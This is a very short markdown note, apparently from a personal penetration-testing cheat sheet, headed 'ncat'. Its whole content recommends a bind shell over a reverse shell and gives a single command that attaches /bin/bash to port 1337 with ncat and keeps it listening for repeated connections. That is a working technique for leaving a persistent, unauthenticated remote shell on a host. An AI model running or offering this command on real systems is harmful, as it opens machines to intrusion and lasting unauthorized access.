---
publish: true
created: 2026-10-03T08:40:24.740Z
modified: 2026-10-03T08:40:24.740Z
---

### ncat

Instead of using `nc` for reverse shell. use ncat for bind shell. it will keep listening on this port forever.

```
./ncat -k -e /bin/bash -lp 1337
```
